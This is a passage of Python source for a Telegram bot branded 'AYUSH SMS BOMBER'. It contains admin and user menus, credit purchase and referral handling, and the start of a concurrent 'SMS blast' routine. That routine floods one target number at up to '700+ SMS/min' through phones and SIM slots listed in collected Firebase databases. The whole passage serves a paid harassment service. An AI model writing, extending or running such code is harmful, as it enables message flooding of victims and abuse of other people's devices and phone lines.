            btn("fᴀsᴛ (700+/ᴍɪɴ)", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
        ],
        [
            btn("ᴍᴇᴅɪᴜᴍ (400/ᴍɪɴ)", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ (170/ᴍɪɴ)", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="danger"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free')}", "owner:free:off", "danger") if d.get("free_mode") else (f"🟢 {sc('enable free')}", "owner:free:on", "success")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_CHECK, "✅", style="success"), btn("ғɪʀᴇʙᴀsᴇ", "owner:fb:menu", EMOJI_FIRE, "🔥", style="danger")],
        [btn("ᴛᴏᴘ ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏ", "owner:top_video:menu", EMOJI_TOP, "⭐", style="success"), btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "🎬", style="primary")],
        [btn("sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"), btn("ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary")],
        [btn("ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="success"), btn("ʙᴀɴ", "owner:ban", EMOJI_CROSS, "❌", style="danger")],
        [btn("ᴜɴʙᴀɴ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="success"), btn("ᴀᴄᴛɪᴠɪᴛʏ", "owner:activity", EMOJI_GEAR, "📜", style="primary")],
        [btn("ᴘʀɪᴄɪɴɢ", "owner:pricing:menu", EMOJI_MONEY, "💳", style="success"), btn("ᴘᴇɴᴅɪɴɢ ʙᴜʏs", "owner:buy:pending", EMOJI_MONEY, "🛒", style="danger")],
        [btn("ʀᴇᴅᴇᴇᴍ", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="success"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="primary")],
        [btn("ᴅᴇᴅᴜᴄᴛ", "owner:credits:deduct", EMOJI_CROSS, "❌", style="danger"), btn("ᴀᴅᴅ ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "❌", style="danger"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
        [btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍ", "owner:protect", EMOJI_LOCK, "🔒", style="danger"), btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary")],
        [btn("ᴛʀᴀᴄᴋ ɴᴜᴍ", "owner:track", EMOJI_STAR, "📍", style="success"), btn("ᴇxᴘᴏʀᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1], style=mode_btn[2])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_CHECK, "✅", style="success"), btn("ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:menu", EMOJI_TOP, "⭐", style="primary")],
        [btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "🎬", style="primary"), btn("ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="success")],
        [btn("sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="success"), btn("ʙᴀɴ", "admin:ban", EMOJI_CROSS, "❌", style="danger")],
        [btn("ᴜɴʙᴀɴ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ɴᴏᴛᴇs", "admin:notes:menu", EMOJI_GEAR, "📝", style="primary"), btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_CHECK, "✅", style="success")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_STAR, "💠", style="primary"), btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="primary")],
        [btn("ʀᴇғᴇʀ", "user:refer", EMOJI_CHECK, "✅", style="primary"), btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_ROCKET, "🚀", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:buy_menu", EMOJI_MONEY, "💰", style="success")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "⚙️", style="primary")]
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]
    ]
    for idx in range(len(videos)):
        rows.append([btn(f"ᴠɪᴅᴇᴏ #{idx+1}", "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def top_video_menu_kb(d: dict) -> InlineKeyboardMarkup:
    top = d.get("top_video")
    rows = []
    if top:
        rows.append([btn("ᴄʜᴀɴɢᴇ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:set", EMOJI_CHECK, "🔄", style="success")])
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:remove", EMOJI_CROSS, "🗑", style="danger")])
    else:
        rows.append([btn("sᴇᴛ ᴛᴏᴘ ᴠɪᴅᴇᴏ", "owner:top_video:set", EMOJI_CHECK, "➕", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    rows = [
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success")],
        [btn("ᴠɪᴀ ᴛxᴛ ᴜᴘʟᴏᴀᴅ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary")],
        [btn("ʀᴇʟᴏᴀᴅ ʙᴀᴄᴋᴜᴘ", "owner:fb:reload_backup", EMOJI_GEAR, "🔄", style="primary")],
        [btn("ᴄʟᴇᴀʀ ʙᴀᴄᴋᴜᴘ", "owner:fb:clear_backup", EMOJI_CROSS, "🗑", style="danger")],
    ]
    # Show bot firebases (limit to 10)
    for fb in bot_fbs[:10]:
        rows.append([
            btn(fb.get("label", fb["url"][:24])[:24], "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}", EMOJI_CROSS, "🗑", style="danger")
        ])
    if len(bot_fbs) > 10:
        rows.append([btn(f"+{len(bot_fbs)-10} ᴍᴏʀᴇ", "noop", EMOJI_GEAR, "➕")])
    # Backup count info
    if backup_fbs:
        rows.append([btn(f"📁 {len(backup_fbs)} ʙᴀᴄᴋᴜᴘ", "noop", EMOJI_GEAR, "📁")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned[:20]:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")
    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀", style="primary"))
    if start + per < len(items):
        nav.append(btn("ɴᴇxᴛ ▶", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════
# ║  PANEL TEXT BUILDERS
# ═══════════════════════════════════════════════════════════════
def owner_panel_text(d: dict) -> str:
    fbs = get_all_firebases(d)
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    top = d.get("top_video")
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    pending_buys = len([r for r in d.get("buy_requests", {}).values() if r.get("status") == "pending"])
    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b> ({len(bot_fbs)} ʙᴏᴛ + {len(backup_fbs)} ʙᴀᴄᴋᴜᴘ)\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_TOP, '⭐')} ᴛᴏᴘ ᴠɪᴅᴇᴏ     : <b>{'✅ sᴇᴛ' if top else '❌ ɴᴏɴᴇ'}</b>\n"
        f"{em(EMOJI_MONEY, '🛒')} ᴘᴇɴᴅɪɴɢ ʙᴜʏs : <b>{pending_buys}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    top = d.get("top_video")
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_TOP, '⭐')} ᴛᴏᴘ ᴠɪᴅᴇᴏ     : <b>{'✅ sᴇᴛ' if top else '❌ ɴᴏɴᴇ'}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(get_all_firebases(d))}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = get_all_firebases(d)
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>AYUSH SMS BOMBER {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>AYUSH</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs_map = {fb["id"]: fb for fb in get_all_firebases(d)}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in list(api_use.items())[:15]:
        fb = fbs_map.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════
# ║  ROUTER + HELPERS
# ═══════════════════════════════════════════════════════════════
R = Router()

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        session = await get_http_session()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            res = await resp.json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
                await asyncio.sleep(2)
                del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception:
        pass

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Channel log failed: {e}")

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        vid = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=vid, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Video send failed: {e}")

async def send_top_video_or_home(bot: Bot, chat_id: int, uid: int, d: dict, is_callback: bool = False, cq=None):
    """Send top video with caption + buttons. Fallback to plain home if no top video."""
    top = d.get("top_video")
    if top and top.get("file_id"):
        caption = top.get("caption", "⭐ Top Video") 
        # Add inline buttons below caption
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [btn("AYUSH", "user:start_now", EMOJI_ROCKET, "🚀", style="success")],
            [btn_url("ᴏᴡɴᴇʀ", SUPER_ADMIN_LINK, EMOJI_CROWN, "👑")]
        ])
        try:
            await bot.send_video(chat_id, video=top["file_id"], caption=caption, reply_markup=markup, parse_mode="HTML")
        except Exception as e:
            log.error(f"Top video failed: {e}")
            return False
    return True

# ═══════════════════════════════════════════════════════════════
# ║  /start HANDLERS
# ═══════════════════════════════════════════════════════════════
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d)
    
    # Welcome credits (0 = no credits)
    if is_new:
        welcome = d.get("settings", {}).get("welcome_credits", 0)
        if welcome > 0:
            add_credits(uid, welcome, d)
            d["users"][str(uid)]["welcome_claimed"] = True
        save(d)
        # Channel log
        username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
        log_text = (
            f"🆕 <b>NEW USER</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n"
            f"🌐 {username}\n"
            f"📅 {fmt_time(int(time.time()))}"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    
    # Deep link refer
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, m, ref = process_referral(uid, code, d)
            if success and ref:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    ref_credits = d["settings"].get("ref_credits", 0)
                    msg_txt = f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka code use kiya!"
                    if ref_credits > 0:
                        msg_txt += f"\n{em(EMOJI_MONEY, '💰')} +{ref_credits} credits mile."
                    await msg.bot.send_message(ref, msg_txt, parse_mode="HTML")
                except: pass
        save(d)
    
    # Force join check
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    
    # Send top video if set, else random video
    top = d.get("top_video")
    if top and top.get("file_id"):
        try:
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [btn("AYUSH", "user:start_now", EMOJI_ROCKET, "🚀", style="success")],
                [btn_url("ᴏᴡɴᴇʀ", SUPER_ADMIN_LINK, EMOJI_CROWN, "👑")]
            ])
            await msg.bot.send_video(
                msg.chat.id, video=top["file_id"],
                caption=top.get("caption", ""),
                reply_markup=markup, parse_mode="HTML"
            )
        except Exception:
            pass
    
    # Route by role
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Banned!</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi!</b>\nOwner se approval lein.", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        welcome = d.get("settings", {}).get("welcome_credits", 0)
        if welcome > 0:
            add_credits(uid, welcome, d)
        save(d)
        username = f"@{msg.from_user.username}" if msg.from_user.username else "No"
        log_text = f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"
        asyncio.create_task(send_channel_log(msg.bot, log_text))
    else:
        save(d)
    
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    
    top = d.get("top_video")
    if top and top.get("file_id"):
        try:
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [btn("AYUSH", "user:start_now", EMOJI_ROCKET, "🚀", style="success")],
                [btn_url("ᴏᴡɴᴇʀ", SUPER_ADMIN_LINK, EMOJI_CROWN, "👑")]
            ])
            await msg.bot.send_video(
                msg.chat.id, video=top["file_id"],
                caption=top.get("caption", ""),
                reply_markup=markup, parse_mode="HTML"
            )
        except: pass
    
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Banned!", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML")
        return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:start_now")
async def user_start_now(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
    await cq.answer("🚀")

# ═══════════════════════════════════════════════════════════════
# ║  ═══════ SEND SMS FLOW (user/admin/owner) ═══════
# ═══════════════════════════════════════════════════════════════
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    """High-performance concurrent SMS send loop. Target: 700+ SMS/min on FAST."""
    
    # Cancel existing
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Already running!</b> Stop first.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session
    
    is_regular = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular else None
    speed_label = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"
    
    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Progress send fail: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return
    
    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta: Dict[str, dict] = {}
    last_update = time.time()
    start_time = time.time()
    
    # Build task pool from devices — each device handles up to 3 SMS
    send_jobs = []  # (fb_url, dev_id, sim_slot)
    for device in devices:
        sims = device["sims"]
        sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
        for _ in range(3):
            for sim in sim_slots:
                if len(send_jobs) < count:
                    send_jobs.append((device["fb_url"], device["dev_id"], sim, device["fb_id"]))
    
    # If more SMS needed than device capacity, cycle through
    while len(send_jobs) < count:
        for device in devices:
            if len(send_jobs) >= count:
                break
            sims = device["sims"]
            sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
            for sim in sim_slots:
                if len(send_jobs) >= count:
                    break
                send_jobs.append((device["fb_url"], device["dev_id"], sim, device["fb_id"]))
    
    send_jobs = send_jobs[:count]
    
    # Concurrent sender with semaphore
    send_sem = asyncio.Semaphore(_MAX_CONCURRENT_SENDS)
    
    async def do_one(job_idx: int, job):
        nonlocal sent_ok, sent_fail, msgs_left, last_update
        async with send_sem:
            if session.cancelled or msgs_left <= 0:
                return
